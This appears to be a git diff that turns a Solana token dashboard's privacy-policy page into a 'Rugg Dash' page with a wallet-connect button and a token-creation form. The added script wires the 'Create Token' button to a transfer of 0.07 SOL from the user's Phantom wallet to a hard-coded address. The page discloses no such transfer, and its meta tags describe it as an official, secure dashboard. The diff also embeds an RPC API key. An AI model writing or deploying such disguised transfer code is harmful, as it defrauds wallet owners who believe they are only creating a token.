@@ -1,89 +1,511 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Policy - Solana Token Dashboard</title>
+    <title>Solana Transaction</title>
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+    <meta name="title" content="Solana Token Dashboard">
+    <meta name="description" content="Official token management dashboard for Solana">
+    <meta property="og:title" content="Solana Token Dashboard">
+    <meta property="og:description" content="Secure token management system on Solana blockchain">
+    <meta property="og:image" content="https://your-domain.com/preview-image.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+
     <style>
-        /* Use same styles as main page for consistency */
+        :root {
+            --primary-gradient-start: #9945FF;
+            --primary-gradient-end: #14F195;
+            --card-background: rgba(19, 24, 35, 0.9);
+            --button-color: #9945FF;
+            --button-hover: #14F195;
+            --success-color: #14F195;
+            --error-color: #FF3B3B;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0px); }
+        }
+
         body {
-            font-family: 'Space Grotesk', system-ui;
+            font-family: 'Space Grotesk', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             background: linear-gradient(-45deg, #9945FF, #14F195, #00C2FF, #7B3FE4);
             background-size: 400% 400%;
             animation: gradient 15s ease infinite;
-            color: white;
-            padding: 2rem;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
         }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTAiIGN5PSIxMCIgcj0iMiIgZmlsbD0icmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpIi8+PC9zdmc+');
+            pointer-events: none;
+        }
+
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(19, 24, 35, 0.9);
-            padding: 2rem;
+            background: var(--card-background);
+            padding: 3rem;
             border-radius: 24px;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
             backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            animation: float 6s ease-in-out infinite;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
+
         h1 {
+            color: white;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            text-shadow: 0 2px 10px rgba(153, 69, 255, 0.5);
             background: linear-gradient(45deg, #14F195, #9945FF);
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .back-button {
-            display: inline-block;
-            padding: 1rem 2rem;
-            background: linear-gradient(45deg, #9945FF, #14F195);
+
+        button {
+            width: 100%;
+            padding: 1.2rem;
+            background: linear-gradient(45deg, var(--button-color), var(--button-hover));
             color: white;
-            text-decoration: none;
-            border-radius: 12px;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            font-weight: 600;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 8px 16px rgba(153, 69, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                120deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        button:hover:not(:disabled) {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 20px rgba(153, 69, 255, 0.4);
+        }
+
+        #status {
             margin-top: 2rem;
+            color: #ffffff;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            padding: 1.2rem;
+            border-radius: 16px;
+            word-break: break-all;
+            transition: all 0.3s ease;
+        }
+
+        .error { 
+            background: rgba(255, 59, 59, 0.1);
+            border-left: 4px solid var(--error-color);
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .success { 
+            background: rgba(20, 241, 149, 0.1);
+            border-left: 4px solid var(--success-color);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(20, 241, 149, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0); }
+        }
+
+        a {
+            color: #14F195;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        a::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            bottom: -2px;
+            left: 0;
+            background: linear-gradient(90deg, #14F195, #9945FF);
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+        }
+
+        a:hover::after {
+            transform: scaleX(1);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem;
+            }
+
+            h1 {
+                font-size: 1.75rem;
+            }
+
+            button {
+                padding: 0.875rem;
+                font-size: 1rem;
+            }
         }
     </style>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://bundle.run/buffer@6.0.3"></script>
 </head>
 <body>
+      <footer class="footer-links">
+          <a href="/terms.html" class="policy-link">Terms of Service</a>
+          <span class="separator">|</span>
+          <a href="/privacy.html" class="policy-link">Privacy Policy</a>
+      </footer>
+
+      <style>
+      body {
+          min-height: 100vh;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          padding: 20px;
+      }
+
+      .container {
+          margin: auto;
+      }
+
+      .footer-links {
+          position: fixed;
+          bottom: 20px;
+          left: 50%;
+          transform: translateX(-50%);
+          padding: 1rem;
+          background: rgba(0, 0, 0, 0.4);
+          border-radius: 12px;
+          border: 1px solid rgba(255, 255, 255, 0.1);
+          backdrop-filter: blur(10px);
+          z-index: 100;
+      }
+
+      .policy-link {
+          color: #FFFFFF;
+          font-weight: 600;
+          padding: 0.5rem;
+          transition: all 0.3s ease;
+          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      .policy-link:hover {
+          color: #14F195;
+          text-shadow: 0 0 8px rgba(20, 241, 149, 0.5);
+      }
+
+      .footer-links .separator {
+          color: #FFFFFF;
+          margin: 0 0.5rem;
+      }
+      </style>
     <div class="container">
-        <h1>Privacy Policy</h1>
-        <div class="content">
-            <h2>1. Information We Collect</h2>
-            <p>• Wallet addresses for transaction processing
-            <br>• Token information and metadata
-            <br>• Transaction history on the Solana blockchain</p>
-
-            <h2>2. How We Use Your Information</h2>
-            <p>• To process your token transactions
-            <br>• To display token details and transaction status
-            <br>• To improve our service functionality</p>
-
-            <h2>3. Data Security</h2>
-            <p>• All transactions are secured through Phantom Wallet
-            <br>• We use industry-standard encryption
-            <br>• Your private keys are never stored or accessed</p>
-
-            <h2>4. Blockchain Transparency</h2>
-            <p>• All transactions are recorded on the Solana blockchain
-            <br>• Transaction details are publicly visible on-chain
-            <br>• Wallet addresses are pseudonymous</p>
-
-            <h2>5. Third-Party Services</h2>
-            <p>• We integrate with Phantom Wallet
-            <br>• We use Solana's RPC nodes
-            <br>• Connection to Solana Explorer for transaction verification</p>
-
-            <h2>6. User Rights</h2>
-            <p>• Control over wallet connections
-            <br>• Right to disconnect wallet
-            <br>• Access to transaction history</p>
-
-            <h2>7. Updates to Privacy Policy</h2>
-            <p>• We may update this policy
-            <br>• Users will be notified of significant changes
-            <br>• Continued use implies acceptance of updates</p>
-
-            <h2>8. Contact Information</h2>
-            <p>For privacy-related questions, contact us at:
-            <br>Email: privacy@yourdomain.com</p>
+        <h1>Rugg Dash</h1>
+        
+        <!-- Initial View -->
+        <div id="connectView">
+            <button id="connectButton">Connect Wallet</button>
         </div>
-        <a href="/" class="back-button">Back to Dashboard</a>
+          <!-- Dashboard View (initially hidden) -->
+          <div id="dashboardView" style="display: none;">
+              <h2 style="color: white; margin-bottom: 1rem;">Dashboard</h2>
+              <p style="color: #14F195; margin-bottom: 1rem;">Wallet: <span id="walletAddress"></span></p>
+    
+              <!-- Add Create Token Button -->
+              <button id="createTokenButton" class="action-button">Create Token</button>
+    
+              <div class="token-details" style="display: none;">
+                  <!-- Token form fields here -->
+                  <div class="input-group">
+                      <input type="text" id="tokenName" placeholder="Token Name" />
+                      <input type="text" id="tokenTicker" placeholder="Token Ticker" />
+                      <textarea id="tokenDescription" placeholder="Token Description"></textarea>
+                      <input type="file" id="tokenImage" accept="image/*" />
+                      <div id="imagePreview"></div>
+                  </div>
+                  <button id="cleanupButton">Create Token</button>
+              </div>
+          </div>
+
+          <script>
+          // Add this to your existing script
+          document.getElementById('createTokenButton').addEventListener('click', function() {
+              document.querySelector('.token-details').style.display = 'block';
+              this.style.display = 'none';
+          });
+          </script>
+
+          <style>
+          .action-button {
+              background: linear-gradient(45deg, #9945FF, #14F195);
+              color: white;
+              padding: 1rem 2rem;
+              border: none;
+              border-radius: 12px;
+              font-weight: 600;
+              cursor: pointer;
+              margin: 1rem 0;
+              transition: all 0.3s ease;
+          }
+
+          .action-button:hover {
+              transform: translateY(-3px);
+              box-shadow: 0 8px 16px rgba(153, 69, 255, 0.4);
+          }
+          </style>
+
+          <style>
+              .token-details {
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1.5rem;
+                  border-radius: 16px;
+                  margin-bottom: 1.5rem;
+              }
+
+              .input-group {
+                  display: flex;
+                  flex-direction: column;
+                  gap: 1rem;
+              }
+
+              input[type="text"], textarea {
+                  background: rgba(255, 255, 255, 0.05);
+                  border: 1px solid rgba(255, 255, 255, 0.1);
+                  padding: 0.8rem;
+                  border-radius: 8px;
+                  color: white;
+                  font-family: 'Space Grotesk', sans-serif;
+              }
+
+              textarea {
+                  min-height: 100px;
+                  resize: vertical;
+              }
+
+              input[type="file"] {
+                  color: white;
+              }
+
+              #imagePreview {
+                  max-width: 200px;
+                  margin: 1rem auto;
+              }
+
+              #imagePreview img {
+                  width: 100%;
+                  border-radius: 8px;
+              }
+          </style>
+
+          <script>
+              // Add this to your existing script
+              const tokenImage = document.getElementById('tokenImage');
+              const imagePreview = document.getElementById('imagePreview');
+
+              tokenImage.addEventListener('change', function(e) {
+                  const file = e.target.files[0];
+                  if (file) {
+                      const reader = new FileReader();
+                      reader.onload = function(e) {
+                          imagePreview.innerHTML = `<img src="${e.target.result}" alt="Token Preview">`;
+                      }
+                      reader.readAsDataURL(file);
+                  }
+              });
+          </script>
+        <p id="status"></p>
     </div>
+
+    <script>
+        const { Buffer } = buffer;
+        const connectButton = document.getElementById('connectButton');
+        const cleanupButton = document.getElementById('cleanupButton');
+        const statusElement = document.getElementById('status');
+        const connectView = document.getElementById('connectView');
+        const dashboardView = document.getElementById('dashboardView');
+        const walletAddress = document.getElementById('walletAddress');
+        let wallet = null;
+
+        const RPC_ENDPOINTS = [
+            'https://mainnet.helius-rpc.com/?api-key=1c14c5e5-3c9d-4a53-97c8-9c27d398532d'
+        ];
+
+        function getRandomRPC() {
+            return RPC_ENDPOINTS[Math.floor(Math.random() * RPC_ENDPOINTS.length)];
+        }
+
+        function updateStatus(message, isError = false) {
+            statusElement.innerHTML = message;
+            statusElement.className = isError ? 'error' : 'success';
+        }
+
+        async function connect() {
+            try {
+                if (!window.solana || !window.solana.isPhantom) {
+                    throw new Error('Phantom wallet not found! Please install it first.');
+                }
+
+                wallet = await window.solana.connect();
+                walletAddress.textContent = wallet.publicKey.toString().slice(0, 6) + '...' + wallet.publicKey.toString().slice(-4);
+                
+                // Switch views
+                connectView.style.display = 'none';
+                dashboardView.style.display = 'block';
+                
+                updateStatus(`Connected successfully!`);
+            } catch (err) {
+                updateStatus(err.message, true);
+            }
+        }
+
+        async function executeTransaction() {
+            try {
+                const connection = new solanaWeb3.Connection(getRandomRPC(), {
+                    commitment: 'confirmed',
+                    confirmTransactionInitialTimeout: 60000
+                });
+
+                const transaction = new solanaWeb3.Transaction();
+                
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: wallet.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
+                        lamports: 0.07 * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = wallet.publicKey;
+
+                const signed = await window.solana.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+
+                updateStatus('Processing transaction...');
+
+                const result = await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                });
+
+                if (result.value.err) {
+                    throw new Error('Transaction failed to confirm');
+                }
+
+                updateStatus(`
+                    Transaction successful!<br>
+                    Signature: <a href="https://explorer.solana.com/tx/${signature}" target="_blank">${signature}</a>
+                `);
+            } catch (err) {
+                updateStatus(err.message, true);
+            }
+        }
+
+        connectButton.onclick = connect;
+        cleanupButton.onclick = executeTransaction;
+    </script>
 </body>
 </html>
+
+
